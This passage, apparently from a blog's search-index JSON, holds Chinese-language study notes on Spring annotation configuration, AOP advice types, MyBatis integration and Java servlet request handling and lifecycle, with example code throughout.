@Autowired 注解开启自动装配模式 (按类型)\n\n@Component\n@Scope(\"singleton\")\npublic class BookServiceImpl implements BookService &#123;\n\n    @Autowired\n    private BookDao bookDao;\n\n    @Override\n    public void save() &#123;\n        System.out.println(\"book service save ...\");\n        bookDao.save();\n    &#125;\n&#125;\n\n注意：自动装配基于反射设计创建对象并暴力反射对应属性为私有属性初始化数据，因此无需提供 setter 方法\n注意：自动转配建议使用无参构造方法创建对象（默认），如果不提供对应构造方法，请提供唯一的构造方法\n使用 @Qualifier 注解开启指定名称装配 Bean\n\n @Service\n@Scope(\"singleton\")\npublic class BookServiceImpl implements BookService &#123;\n\n    @Autowired\n    @Qualifier(\"boookDao\")\n    private BookDao bookDao;\n&#125;\n\n注意：@Qualifier 注解无法单独使用，必须配合 @Autowired 注解使用\n\n# 20.1 简单类型注入\n\n使用 @Value 实现简单类型注入\n\n@Repository\n@Scope(\"singleton\")\npublic class BookDaoImpl implements BookDao &#123;\n\n    @Value(\"itheima666\")\n    private String name;\n&#125;\n# 20.2 加载外部 properties 文件\n\n使用 @Properties 注解加载 properties 文件\n\n@Component\n@ComponentScan(\"com.itheima\")\n@PropertySource(\"jdbc.properties\")\npublic class SpringConfig &#123;\n&#125;\n\n注意：路径仅支持单一文件配置，多文件使用数组格式配置，不允许使用通配符 *\n\n@Service\npublic class BookServiceImpl implements BookService&#123;\n\n    @Autowired\n    private BookDao bookDao;\n\n    @Value(\"$&#123;name&#125;\")\t//使用$&#123;&#125;的方式加载配置文件的变量\n    private String name;\n\n    @Value(\"30\")\n    private int age;\n\n    @Override\n    public void save() &#123;\n        System.out.println(\"book service save ...\");\n        System.out.println(name + \"  :  \" + age);\n        bookDao.save();\n    &#125;\n&#125;\n# 21、注解开发第三方 bean 管理\n# 21.1 第三方 bin 管理\n\n管理第三方 bean，由于不能将注解直接写在源代码中，只能使用编程的方法配置\n使用 @Bean 配置第三方 bean，在配置文件里写\n\n@Configuration\npublic class SpringConfig &#123;\n\n    //1.定义方法获得要管理的对象\n    //2.添加@Bean，表示当前方法的返回值是一个bean\n    @Bean(\"dataSource\")\n    //bean名可以不写，通过类获取bean\n    public DataSource dataSource() &#123;\n        DruidDataSource ds = new DruidDataSource();\n        ds.setDriverClassName(\"com.mysql.jdbc.Driver\");\n        ds.setUrl(\"jdbc:mysql://localhost:3306/spring_db\");\n        ds.setUsername(\"root\");\n        ds.setPassword(\"root\");\n        return ds;\n    &#125;\n&#125;\npublic class App &#123;\n    public static void main(String[] args) &#123;\n        AnnotationConfigApplicationContext ctx = new AnnotationConfigApplicationContext(SpringConfig.class);\n        DataSource dataSource = ctx.getBean(DataSource.class);\n        System.out.println(dataSource);\n    &#125;\n&#125;\n\n不建议将 bean 方法直接写到配置类里，要将方法写到独立的配置文件里\n方式一：导入式 —— 建议使用\n\npublic class JDBCConfig &#123;\n    @Bean\n    //bean名可以不写，通过类获取bean\n    public DataSource dataSource() &#123;\n        DruidDataSource ds = new DruidDataSource();\n        ds.setDriverClassName(\"com.mysql.jdbc.Driver\");\n        ds.setUrl(\"jdbc:mysql://localhost:3306/spring_db\");\n        ds.setUsername(\"root\");\n        ds.setPassword(\"root\");\n        return ds;\n    &#125;\n&#125;\n@Configuration\n//使用@Import注解手动加入配置类到核心配置，此注解只能添加一次，多个数据请用数组格式\n@Import(&#123;JDBCConfig.class&#125;)\npublic class SpringConfig &#123;\n&#125;\n\n方式二：扫描式 —— 不建议使用\n\n@Configuration\n@ComponentScan(&#123;\"com.itheima.config\"&#125;)\npublic class SpringConfig &#123;\n&#125;\n# 21.2 第三方 bean 注入资源\n# 21.2.1 简单类型依赖注入\npublic class JDBCConfig &#123;\n\n    @Value(\"com.mysql.jdbc.Driver\")\n    private String driver;\n    @Value(\"jdbc:mysql://localhost:3306/spring_db\")\n    private String url;\n    @Value(\"root\")\n    private String userName;\n    @Value(\"root\")\n    private String password;\n\n    @Bean\n    //bean名可以不写，通过类获取bean\n    public DataSource dataSource() &#123;\n        DruidDataSource ds = new DruidDataSource();\n        ds.setDriverClassName(driver);\n        ds.setUrl(url);\n        ds.setUsername(userName);\n        ds.setPassword(password);\n        return ds;\n    &#125;\n&#125;\n# 21.2.2 引用类型依赖注入\n\n引用类型注入只需要在方法写形参即可，会自动进行注入操作\n\n@Bean\n//bean名可以不写，通过类获取bean\npublic DataSource dataSource(BookDao bookDao) &#123;\n    bookDao.save();\n    DruidDataSource ds = new DruidDataSource();\n    ds.setDriverClassName(driver);\n    ds.setUrl(url);\n    ds.setUsername(userName);\n    ds.setPassword(password);\n    return ds;\n&#125;\n\n引用类型注入只需要为 bean 定义方法设置形参即可，容器会根据类型自动装配 bean 对象，bean 对象要设置为 bean\n\n# 22、注解开发总结\n# 22.1 XML 配置对比注解配置\n\n# 23、Spring 整合 MyBatis\n# 23.1 思路分析\n\n\n最核心的对象：sqlSessionFactory\n\n\n# 23.2 整合 mybatis\n\n导入坐标\n\n&lt;dependencies>\n    &lt;dependency>\n        &lt;groupId>org.mybatis&lt;/groupId>\n        &lt;artifactId>mybatis&lt;/artifactId>\n        &lt;version>3.5.6&lt;/version>\n    &lt;/dependency>\n    &lt;dependency>\n        &lt;groupId>mysql&lt;/groupId>\n        &lt;artifactId>mysql-connector-java&lt;/artifactId>\n        &lt;version>5.1.46&lt;/version>\n    &lt;/dependency>\n    &lt;dependency>\n        &lt;groupId>junit&lt;/groupId>\n        &lt;artifactId>junit&lt;/artifactId>\n        &lt;version>4.11&lt;/version>\n        &lt;scope>test&lt;/scope>\n    &lt;/dependency>\n    &lt;dependency>\n        &lt;groupId>org.springframework&lt;/groupId>\n        &lt;artifactId>spring-context&lt;/artifactId>\n        &lt;version>5.2.10.RELEASE&lt;/version>\n    &lt;/dependency>\n    &lt;dependency>德鲁伊坐标\n        &lt;groupId>com.alibaba&lt;/groupId>\n        &lt;artifactId>druid&lt;/artifactId>\n        &lt;version>1.1.16&lt;/version>\n    &lt;/dependency>\n&lt;!--下面两个是单独需要的-->\n    &lt;dependency>spring整合jdbc坐标\n        &lt;groupId>org.springframework&lt;/groupId>\n        &lt;artifactId>spring-jdbc&lt;/artifactId>\n        &lt;version>5.2.10.RELEASE&lt;/version>\n    &lt;/dependency>\n\n    &lt;dependency>spring整合mybatis坐标\n        &lt;groupId>org.mybatis&lt;/groupId>\n        &lt;artifactId>mybatis-spring&lt;/artifactId>\n        &lt;version>1.3.0&lt;/version>\n    &lt;/dependency>\n&lt;/dependencies>\n# 24、Spring 整合 Junit\n# 25、AOP 简介\n\nAOP（Aspect Oriented Programming）面向切面编程，一种编程范式，指导开发者如何组织程序结构\n\nOOP 面向对象编程\n\n\n作用：在不惊动原始设计的基础上为其进行功能增强\nSpring 理念：无侵入式 \\ 无侵入式编程\n\n\n\n连接点（JoinPoint）：程序执行过程中的任意位置，粒度为执行方法、抛出异常、设置变量等\n\n在 SpringAOP 中理解为方法的执行\n\n\n切入点（Pointcut）：匹配连接点的式子\n\n在 SpringAOP 中，一个切入点可以只描述一个具体方法，也可以匹配多个方法\n\n一个具体方法：com.itheima. dao 包下的 BookDao 接口中的无形参无返回值的 save 方法\n匹配多个方法：所有的 save 方法，所有的 get 开头的方法，所有以 Dao 结尾的接口中的任意方法，所有带有一个参数的方法\n\n\n\n\n通知（Advice )︰在切入点处执行的操作，也就是共性功能\n\n在 SpringAOP 中，功能最终以方法的形式呈现\n\n\n通知类∶定义通知的类通知类：定义通知的类\n切面 (Aspect)︰描述通知与切入点的对应关系切面 (方面)：描述通知与切入点的对应关系\n\n# 26、AOP 入门案例\n案例设定：测定接口执行效率\n简化设定：在接口执行前输出当前系统时间\n开发模式：XML or 注解\n思路分析\n\n导入坐标\n制作连接点方法（原始操作，Dao 接口与实现类）\n制作共性功能（通知与通知类）\n定义切入点\n绑定切入点与通知面的关系（切面）\n\n\n导包：context 包导入后 AOP 的包自动导入\n\n\n\n导入 aspect 包\n\n&lt;dependency>\n    &lt;groupId>org.aspectj&lt;/groupId>\n    &lt;artifactId>aspectjweaver&lt;/artifactId>\n    &lt;version>1.9.9&lt;/version>\n&lt;/dependency>\n\n定义 dao 接口与实现类\n\npublic interface BookDao &#123;\n    void save();\n    void update();\n&#125;\n@Repository\npublic class BookDaoImpl implements BookDao &#123;\n    @Override\n    public void save() &#123;\n        System.out.println(System.currentTimeMillis());\n        System.out.println(\"book dao save ...\");\n    &#125;\n\n    @Override\n    public void update() &#123;\n        System.out.println(\"book dao update ...\");\n    &#125;\n&#125;\n\n定义通知类，制作通知\n\npublic class MyAdvice &#123;\n    public void method()&#123;\n        System.out.println(System.currentTimeMillis());\n    &#125;\n&#125;\n\n定义切入点\n\npublic class MyAdvice &#123;\n    //描述切入点\n    @Pointcut(\"execution(void com.itheima.dao.BookDao.update())\")\n    private void pt()&#123;&#125;\n&#125;\n\n绑定切入点与通知关系，并指定通知添加到原始连接点的具体执行位置\n\npublic class MyAdvice &#123;\n    //描述切入点\n    @Pointcut(\"execution(void com.itheima.dao.BookDao.update())\")\n    private void pt()&#123;&#125;\n\n    //绑定切入点\n    @Before(\"pt()\")\n    //定义好通知\n    public void method()&#123;\n        System.out.println(System.currentTimeMillis());\n    &#125;\n&#125;\n\n\n定义通知类受 Spring 容器管理，并定义当前类为切面类\n\n//告诉程序加载这个类\n@Component\n//告诉程序这个类是做AOP的\n@Aspect\npublic class MyAdvice &#123;\n    //描述切入点\n    @Pointcut(\"execution(void com.itheima.dao.BookDao.update())\")\n    private void pt()&#123;&#125;\n\n    //绑定切入点\n    @Before(\"pt()\")\n    //定义好通知\n    public void method()&#123;\n        System.out.println(System.currentTimeMillis());\n    &#125;\n&#125;\n\n开启 Spring 对 AOP 注解驱动支持\n\n@Configuration\n@ComponentScan(\"com.itheima\")\n//告诉程序要用注解开\n@EnableAspectJAutoProxy\npublic class SpringConfig &#123;\n&#125;\n# 27、AOP 工作流程\n# 27.1 AOP 工作流程\n\nSpring 容器启动\n读取所有切面配置中的切入点\n初始化 bean，判定 bean 对应的类中的方法是否匹配到任意切入点\n\n匹配失败，创建对象\n匹配成功，创建原始对象（目标对象）的代理对象\n\n\n获取 bean 执行方法\n\n获取 bean，调用方法并执行，完成操作\n获取的 bean 是代理对象时，根据代理对象的运行模式运行原始方法与增强的内容，完成操作\n\n\n\n\n\n目标对象（Target）：原始功能去掉共性功能对应的类产生的对象，这种对象是无法直接完成最终工作的\n代理（Proxy）：目标对象无法直接完成工作，需要对其进行功能回填，通过原始对象的代理对象实现\n\n# 28、AOP 切入点表达式\n\n切入点：要进行增强的方法\n切入点表达式：要进行增强的方法的描述方式\n\n\n\n\n切入点表达式标准格式：动作关键字（访问修饰符 返回值 包名。类 / 接口名。方法名（参数）异常名\n\n\n# 28.1 通配符\n\n\n可以使用通配符描述切入点，快速描述\n\n\n*：单个独立的任意符号，可以独立出现，也可以作为前缀或者后缀的匹配符出现\nexecution (public * com.itheima.*.UserService.find*(*))\n匹配 con.itheima 包下的任意包中的 UserService 类或接口中所有 find 开头的带有一个参数的方法\n\n\n…：多个连续的任意符号，可以独立出现，常用于简化包名与参数的书写\nexecution (public User com..UserService.findById(..))\n匹配 com 包下的任意包中的 UserService 类或接口中所有名称为 findById 的方法\n\n\n+：专用于匹配子型\nexecution (* *..*Service+.*(..))\n\n\n\n\n# 28.2 书写技巧\n\n所有代码按照标准规范开发，否则以下技巧全部失效\n描述切入点通常描述接口，而不描述实现类\n访问控制修饰符针对接口开发均采用 public 描述（可省略访问控制修饰符描述）\n返回值类型对于增删改类使用精准类型加速匹配，对于查询类使用 * 通配快速描述\n包名书写尽量不使用… 匹配，效率过低，常用 * 做单个包描述匹配，或精准匹配\n接口名 / 类名书写名称与模块相关的采用 * 匹配，例如 UserService 书写成 * Service，绑定业务层接口名\n方法名书写以动词进行精准匹配，名词采用 * 匹配，例如 getById 书写成 getBy*,selectAll 书写成 selectAll\n参数规则较为复杂，根据业务方法灵活调整\n通常不使用异常作为匹配规则\n\n# 29、AOP 通知类型\n\nAOP 通知描述了抽取的共性功能，根据共性功能抽取的位置不同，最终运行代码时要将其加入到合理的位置\nAOP 通知共分为 5 钟类型：\n\n前置通知\n后置通知\n环绕通知（重点）\n返回后通知（了解）\n抛出异常后通知（了解）\n\n\n\n@Before\n@After\n@Around -- 方法要加ProceedingJoinPoint proceedingJoinPoint参数， Object ret &#x3D; proceedingJoinPoint.proceed();表示运行原方法\n@AfterReturning 方法正常运行后\n@AfterThrowing\t方法出异常后\npackage com.itheima.aop;\n\nimport org.aspectj.lang.ProceedingJoinPoint;\nimport org.aspectj.lang.annotation.*;\nimport org.springframework.stereotype.Component;\n\n@Component\n@Aspect\npublic class MyAdvice &#123;\n\n    @Pointcut(\"execution(void com.itheima.dao.BookDao.update())\")\n    public void pt()&#123;&#125;\n    @Pointcut(\"execution(int com.itheima.dao.BookDao.select())\")\n    public void pt2()&#123;&#125;\n\n//    @Before(\"pt()\")\n    public void before()&#123;\n        System.out.println(\"before advice ...\");\n    &#125;\n\n//    @After(\"pt()\")\n    public void after() &#123;\n        System.out.println(\"after advice ...\");\n    &#125;\n\n//    @Around(\"pt()\")\n    public Object around(ProceedingJoinPoint pjp) throws Throwable &#123;\n        System.out.println(\"before advice ...\");\n        //表示对原始方法的调用\n        Object proceed = pjp.proceed();\n        System.out.println(\"after advice ...\");\n        return proceed;\n    &#125;\n\n    @Around(\"pt2()\")\n    public Object aroundSelect(ProceedingJoinPoint proceedingJoinPoint) throws Throwable &#123;\n        System.out.println(\"before advice ...\");\n        //\n        Integer ret = (Integer) proceedingJoinPoint.proceed();\n        System.out.println(\"after advice ...\");\n        return ret + 566;\n    &#125;\n\n    @AfterReturning(\"pt()\")\n    public void afterReturning()&#123;\n        System.out.println(\"afterReturning advice ...\");\n    &#125;\n\n    @AfterThrowing(\"pt2()\")\n    public void afterThrowing()&#123;\n        System.out.println(\"afterThrowing advice ...\");\n    &#125;\n&#125;\n\n@Around 注意事项\n\n环绕通知必须依赖形参 ProceedingJoinPoint 才能实现对原始方法的调用，进而实现原始方法调用前后同时添加通知\n通知中如果未使用 ProceedingJoinPoint 对原始方法进行调用将跳过原始方法的执行\n对原始方法的调用可以不接收返回值，通知方法设置成 void 即可，如果接收返回值，必须设定为 Object 类型\n原始方法的返回值如果是 void 类型，通知方法的返回值类型可以设置成 void, 也可以设置成 Object\n由于无法预知原始方法运行后是否会抛出异常，因此环绕通知方法必须抛出 Throwable 对象\n\n\n\n@Around(\"pt2()\")\npublic Object aroundSelect(ProceedingJoinPoint proceedingJoinPoint) throws Throwable &#123;\n    System.out.println(\"before advice ...\");\n    Integer ret = (Integer) proceedingJoinPoint.proceed();\n    System.out.println(\"after advice ...\");\n    return ret + 566;\n&#125;\n# 30、案例：测量业务层接口万次执行效率\n需求：任意业务层接口执行均可显示其执行效率（执行时长）\n\n分析：\n\n业务功能：业务层接口执行前后分别记录时间，求差值得到执行效率\n通知类型选择前后均可增强的类型 —— 环绕通知\n\n\n\n@Around(\"pt2()\")\npublic Object aroundSelect(ProceedingJoinPoint proceedingJoinPoint) throws Throwable &#123;\n    Signature signature = proceedingJoinPoint.getSignature();//通过签名获取执行类型（接口名）\n    signature.getDeclaringType();//获取类的类型\n    signature.getName();\n    signature.getDeclaringTypeName();//获取执行操作名（方法名）\n    System.out.println(\"before advice ...\");\n    Integer ret = (Integer) proceedingJoinPoint.proceed(); //proceed参数放入pjp.getArgs后可使用修改后的参数当实参\n    System.out.println(\"after advice ...\");\n    return ret + 566;\n&#125;\n# 31、AOP 通知获取数据\n\n\n获取参数\n\n\n获取返回值\n\n\n获取异常\n\n\n获取切入点方法的参数\n\nJoinPoint : 适用于前置、后置、返回后、抛出异常后通知\nProceedJointPoint: 适用于环绕通知\n\n\n\n获取切入点方法返回值\n\n返回后通知\n环绕通知\n\n\n\n获取切入点方法运行异常信息\n\n抛出异常后通知\n环绕通知\n\n\n\n//获取参数\npublic void before (JoinPoint jp) &#123;\n    Object[] args = jp.getArgs();\n    System.out.println(Arrays.toString(args));\n&#125;//ProceedingJoinPoint也有这个方法\n\n//afterReturning获取返回值\n@AfterReturning(value = \"pt()\",returning = \"ret\")\npublic void afterReturning2(Object ret)&#123;\n    System.out.println(\"afterReturning advice ...\" + ret);\n&#125;//jp存在时jp必须是第一个参数\n\n//异常：直接try catch 或注解throwing = \"t\"，形参给个Throwable T\n\n\n\n# 32、AOP 总结\n\n概念︰AOP (Aspect Oriented Programming) 面向切面编程，一种编程范式\n作用︰在不惊动原始设计的基础上为方法进行功能增强\n核心概念\n\n代理 (Proxy) : SpringAOP 的核心本质是采用代理模式实现的\n连接点 (JoinPoint) ：在 SpringAOP 中，理解为任意方法的执行\n切入点 (Pointcut) ：匹配连接点的式子，也是具有共性功能的方法描述\n通知 (Advice)：若干个方法的共性功能，在切入点处执行，最终体现为一个方法\n切面 (Aspect)︰描述通知与切入点的对应关系\n目标对象 (Target)︰被代理的原始对象成为目标对象\n\n\n切入点表达式标准格式︰动作关键字（访问修饰符返回值﹐包名。类 / 接口名。方法名（参数）异常名)\n\nexecution(* com.itheima.service.*Service.*( …))\n\n\n切入点表达式描述通配符:\n\n作用：用于快速描述，范围描述\n*：匹配任意符号（常用)\n…：匹配多个连续的任意符号（常用)\n+︰匹配子类类型\n\n\n切入点表达式书写技巧\n\n按标准规范开发\n查询操作的返回值建议使用 * 匹配\n减少使用… 的形式描述包\n对接口进行描述，使用 * 表示模块名，例如 UserService 的匹配描述为 * Service\n方法名书写保留动词，例如 get，使用 * 表示名词，例如 getById 匹配描述为 getBy*\n参数根据实际情况灵活调整\n\n\n通知类型\n\n前置通知\n后置通知\n环绕通知（重点）\n\n环绕通知依赖形参 ProceedingJoinPoint 才能实现对原始方法的调用（必须在形参第一位）\n环绕通知可以隔离原始方法的调用执行\n环绕通知返回值设置为 Object 类型\n环绕通知中可以对原始方法调用过程中出现的异常进行处理\n\n\n返回后通知\n抛出异常后通知\n\n\n获取切入点方法的参数\n\nJoinPoint：适用于前置、后置、返回后、抛出异常后通知，设置为方法的第一个形参\nProceedJoinPoint：适用于环绕通知\n\n\n获取切入点方法的返回值\n\n返回后通知\n环绕通知\n\n\n获取切入点方法运行异常信息\n\n抛出异常后通知\n环绕通知\n\n\n\n# 33、Spring 事务简介\n\n事务作用：在数据层保障一系列的数据库操作同成功同失败\nSpring 事务作用：在数据层或业务层保障一系列的数据库操作同成功同失败\n\npublic interface PlatformTransactionManager&#123;\n    void commit(TransactionStatus status) throws TransactionException;\n    void rollback(TransactionStatus status) throws TransactionException;\n&#125;\npublic class DataSourceTranscantionManager&#123;\n    \n&#125;\n# 34、案例：银行账户转账\n需求：实现任意两个账户间转账操作\n需求减缩：A 账户减钱，B 账户加钱\n","slug":"Spring","date":"2022-10-06T13:50:01.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"a187860d1ed5ffaa4db85b694be3a055","title":"JavaWeb-Request&Response","content":"# 1、概述\n\nRequest：获取请求数据\nResponse：设置响应数据\nRequest：\n\nRequest 继承体系\nRequest 获取请求数据\nRequest 请求转发\n\n\n\n# 2、Request 继承体系\n\n\n实现类由 tomcat 提供\nTomcat 需要解析请求数据，封装为 request 对象，并且创建 request 对象传递到 service 方法中\n使用 request 对象，查阅 JavaEE API 文档的 HttpServletRequest 接口就行，因为 tomcat 是实现这个接口\nRequest 对象全名：org.apache.catalina.connector.RequestFacade@289d4a7\n\n# 3、Request 获取请求数据\n# 3.1 请求行\nGET &#x2F;request-demo&#x2F;req1?username&#x3D;zhangsan HTTP&#x2F;1.1\n\n请求方式 资源路径 请求参数 版本\n\n\n\n\n方法\n描述\n示例\n\n\n\n\nString getMethod();\n获取请求方式\nget\n\n\nString getContextPath();\n获取虚拟目录（项目访问路径）\n/request-demo\n\n\nStringBuffer getRequestURL();\n获取 URL（统一资源定位符）\nhttp://localhost:8080/request-demo/req1\n\n\nString getRequestURI();\n获取 URI（统一资源标识符）\n/request-demo/req1\n\n\nString getQueryString();\n获取请求参数（get 方式）\nusername=zhangsan&amp;password=123\n\n\n\n# 3.2 请求头\nUser-Agent:Mozilla&#x2F;5.0 Chrome&#x2F;91.0.4472.106\n\n\n\n方法\n描述\n\n\n\n\nString getHeader(String name);\n根据请求头名称，获取值\n\n\n\n# 3.3 请求体\nusername&#x3D;zhangsan&amp;password&#x3D;123\n\nServletInputStream getInputStream (); 获取字节输入流 —— 上传文件\nBufferedReader getReader (); 获取字符输入流 —— 纯文本\n\npackage com.itheima.web;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.BufferedReader;\nimport java.io.IOException;\n\n@WebServlet(\"/req-demo2\")\npublic class ServletRequestDemo2 extends HttpServlet &#123;\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        //浏览器的版本信息\n        String header = req.getHeader(\"user-agent\");\n        System.out.println(header);\n    &#125;\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        //获取post请求体\n        BufferedReader reader = req.getReader();\n        //读取数据\n        String s = reader.readLine();\n        System.out.println(s);\n\n    &#125;\n&#125;\n# 3.4 通用方式获取请求参数\n\n请求参数获取方式：\n\nGET 方式： String getQueryString()\nPOST 方式： BufferedReader getReader()\n\n\n\n\n\nMap&lt;String, String []&gt; getParameterMap (): 获取所有参数 Map 集合\nString [] getParameterValues (String name): 根据名称获取参数值 (数组)\nString getParameter (String name): 根据名称获取参数值 (单个值)\n\npackage com.itheima.web;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.util.Map;\n\n@WebServlet(\"/req-demo3\")\npublic class ServletRequestDemo3 extends HttpServlet &#123;\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        //GET请求逻辑\n        System.out.println(\"get...\");\n        //1.获取所有参数的map集合\n        Map&lt;String, String[]> parameterMap = req.getParameterMap();\n        for (String key : parameterMap.keySet()) &#123;\n            System.out.print(key + \":\");\n            //获取值\n            String[] values = parameterMap.get(key);\n            for (String value : values) &#123;\n                System.out.print(value + \" \");\n            &#125;\n\n            System.out.println(\"\");\n        &#125;\n\n        System.out.println(\"------------------\");\n        //获取数组\n        String[] parameterValues = req.getParameterValues(\"hobby\");\n        for (String parameterValue : parameterValues) &#123;\n            System.out.println(parameterValue);\n        &#125;\n\n        System.out.println(\"-------------------\");\n        //根据key获取单个参数值\n        String parameter = req.getParameter(\"hobby\");\n        String uusername = req.getParameter(\"username\");\n        String password = req.getParameter(\"password\");\n        System.out.println(parameter);\n        System.out.println(uusername);\n        System.out.println(password);\n\n    &#125;\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        //post请求逻辑\n        this.doGet(req,resp);\n    &#125;\n&#125;\n\n最常用的就是 getParameter\n\n# 3.5 请求参数中文乱码处理\n\nPOST\n\n//在前面加一行\nreq.setCharacterEncoding(\"UTF-8\");//设置字符输入流的编码\n\nGET\n\n\nget 获取参数的方式：getQueryString\n\n\n\n做法：将解码后的数据再变成字节数据，再将字节数据使用 UTF-8 解码\n\nString username = req.getParameter(\"username\");\nbyte[] bytes = username.getBytes(\"ISO-8859-1\");\nusername = new String(bytes,\"UTF-8\");\n","slug":"JavaWeb-Request-Response","date":"2022-06-23T13:40:26.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"4d11604afebb47198cf52093f3d2208a","title":"JavaWeb-Servlet","content":"\n快速入门\nServlet 执行流程\nServlet 生命周期\nServlet 体系结构\nServlet URLPattern 配置\nXML 配置方式编写 Servlet\n\n# 1、快速入门\n\n创建 web 项目，导入 servlet 依赖坐标\n定义一个类，实现 Servlet 接口，并重写接口中所有方法，并在 service 方法中输入一句话\n在类上使用 @WebServlet 注解，配置该 Servlet 访问路径\n访问：启动 Tomcat，浏览器输入 url 访问 Servlet\n\npackage com.itheima.web;\n\nimport javax.servlet.*;\nimport javax.servlet.annotation.WebServlet;\nimport java.io.IOException;\n\n@WebServlet(\"/demo1\")\npublic class ServletDemo1 implements Servlet &#123;\n    public ServletDemo1() &#123;\n        super();\n    &#125;\n\n    @Override\n    public int hashCode() &#123;\n        return super.hashCode();\n    &#125;\n\n    @Override\n    public boolean equals(Object obj) &#123;\n        return super.equals(obj);\n    &#125;\n\n    @Override\n    protected Object clone() throws CloneNotSupportedException &#123;\n        return super.clone();\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return super.toString();\n    &#125;\n\n    @Override\n    protected void finalize() throws Throwable &#123;\n        super.finalize();\n    &#125;\n\n    public void init(ServletConfig servletConfig) throws ServletException &#123;\n\n    &#125;\n\n    public ServletConfig getServletConfig() &#123;\n        return null;\n    &#125;\n\n    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;\n        System.out.println(\"Servlet hello World\");\n    &#125;\n\n    public String getServletInfo() &#123;\n        return null;\n    &#125;\n\n    public void destroy() &#123;\n\n    &#125;\n&#125;\n# 2、Servlet 执行流程\n\nServlet 由谁创建？Servlet 由谁调用？\n\nServlet 由 web 服务器创建，Servlet 方法由 web 服务器调用\n\n\n服务器怎么知道 Servlet 中一定有 Service 方法？\n\n因为我们自定义的 Servlet，必须实现 Servlet 接口并复写其方法，而 Servlet 接口中有 service 方法\n\n\n\n# 3、生命周期\n\n对象的生命周期指一个对象从被创建到被销毁的整个过程\nServlet 运行在 Servlet 容器 (web 服务器) 中，其生命周期由容器来管理，分为 4 个阶段：\n\n\n加载和实例化：默认情况下，当 Servlet 第一次被访问时，由容器创建 Servlet 对象\n\n默认情况，Servlet会在第一次访问被容器创建，但是如果创建Servlet比较耗时的话，那么第一个访问的人等待的时间就比较长，用户的体验就比较差，那么我们能不能把Servlet的创建放到服务器启动的时候来创建，具体如何来配置?\n\n@WebServlet(urlPatterns = \"/demo1\",loadOnStartup = 1)\nloadOnstartup的取值有两类情况\n\t（1）负整数:第一次访问时创建Servlet对象\n\t（2）0或正整数:服务器启动时创建Servlet对象，数字越小优先级越高\n\n初始化：在 Servlet 实例化之后，容器将调用 Servlet 的 init () 方法初始化这个对象，完成一些如加载配置文件、创建连接等初始化的工作。该方法只调用一次\n请求处理：每次请求 Servlet 时，Servlet 容器都会调用 Servlet 的 ==service ()== 方法对请求进行处理\n服务终止：当需要释放内存或者容器关闭时，容器就会调用 Servlet 实例的 ==destroy ()== 方法完成资源的释放。在 destroy () 方法调用之后，容器会释放这个 Servlet 实例，该实例随后会被 Java 的垃圾收集器所回收\n\n# 4、方法介绍\n\n初始化方法，在 Servlet 被创建时执行，只执行一次\n\nvoid init(ServletConfig config)\n\n提供服务方法，每次 Servlet 被访问，都会调用该方法\n\nvoid service(ServletRequest servletRequest, ServletResponse servletResponse)\n\n销毁方法，当 Servlet 被销毁时，调用该方法，在内存释放或服务器关闭时销毁 Servlet\n\nvoid destory()\n\n获取 ServletConfig 对象\n\nServletConfig getServletConfig()\n\n获取 Servlet 信息\n\nString getServletInfo()\n# 5、Servlet 体系结构\n\n我们将来开发 B/S 架构的 web 项目，都是针对 HTTP 协议，所以我们自定义 Servlet，会继承 HttpServlet\n\n手写 Servlet 实现方法，这个代码\n\npublic void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;\n    //根据请求方式不同进行分别处理\n    HttpServletRequest request = (HttpServletRequest) servletRequest;\n\n    //1.获取请求方式\n    String method = request.getMethod();\n    //2.判断\n    if(\"GET\".equals(method)) &#123;\n        //get方式的处理逻辑\n        doget(req,res);\n    &#125; else if(\"POST\".equals(method)) &#123;\n        //post方式的处理逻辑\n        dopost(req,res);\n    &#125;\n&#125;\n# 6、Servlet URLPattern 配置\n\nServlet 想要被访问，必须配置其访问路径 (urlPattern)\n\n\n一个 Servlet，可以配置多个 URLPattern\n\n@WebServlet(urlPatterns = {&quot;/demo1&quot;, “/demo2”})\n\n\nURLPattern 配置规则\n\n①精确匹配 ②目录匹配 ③扩展名匹配 ④任意匹配\n\n\n\n\n# 7、XML 配置 Servlet\n&lt;servlet>\n  &lt;servlet-name>demo13&lt;/servlet-name>\n  &lt;servlet-class>com.itheima.web.ServletDemo13&lt;/servlet-class>\n&lt;/servlet>\n&lt;servlet-mapping>\n  &lt;servlet-name>demo13&lt;/servlet-name>\n  &lt;url-pattern>/demo13&lt;/url-pattern>\n&lt;/servlet-mapping>\n","slug":"JavaWeb-Servlet","date":"2022-06-23T13:39:08.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"fa6e3171176b562ddf4dd344027e42d6","title":"JavaWeb-MyBatis","content":"# 1、Mybatis 概述\n# 1.1  Mybatis 概念\n\n\n\n\n\n\n\n\n\n\n\nMyBatis 是一款优秀的持久层框架，用于简化 JDBC 开发\n\n\nMyBatis 本是 Apache 的一个开源项目 iBatis, 2010 年这个项目由 apache software foundation 迁移到了 google code，并且改名为 MyBatis 。2013 年 11 月迁移到 Github\n\n\n官网：https://mybatis.org/mybatis-3/zh/index.html\n\n\n持久层：\n\n\n负责将数据到保存到数据库的那一层代码。\n以后开发我们会将操作数据库的 Java 代码作为持久层。而 Mybatis 就是对 jdbc 代码进行了封装。\n\n\nJavaEE 